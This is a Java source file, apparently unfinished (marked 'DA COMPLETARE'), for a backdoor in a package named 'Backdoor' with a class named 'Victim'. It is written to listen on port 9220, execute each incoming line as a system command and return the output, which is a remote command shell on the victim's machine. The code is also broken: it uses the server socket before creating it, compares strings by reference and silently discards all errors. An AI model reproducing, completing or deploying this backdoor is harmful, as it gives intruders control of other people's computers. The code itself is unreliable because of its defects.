package Backdoor;
//DA COMPLETARE
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.Buffer;

public class Victim extends Thread{

    private ServerSocket socket;
    private Socket client;
    private BufferedReader in;
    private PrintWriter out;
    private Process p;


    public Victim()
    {
        try
        {
            client=null;
            while(client==null)
            {
                client=socket.accept();
            }
            socket=new ServerSocket(9220);
            in=new BufferedReader(new InputStreamReader(client.getInputStream()));
            out = new PrintWriter(client.getOutputStream(), true);
        }
        catch(Exception e)
        {

        }

    }

    public void run()
    {
        String msg=null;

        while(msg!="BackDoorClose")
        {
            try
            {
                msg=in.readLine();

                if(msg==null || msg=="BackDoorClose")
                {
                    msg="BackDoorClose";
                }
                p=Runtime.getRuntime().exec(msg);
                BufferedReader commadOutput=new BufferedReader(new InputStreamReader(p.getInputStream()));
                String resault= commadOutput.readLine();
                out.println(resault);
            }
            catch(Exception e)
            {

            }

        }
    }


    public static void main(String[] args)
    {
        Victim v=new Victim();
        v.start();
    }

}
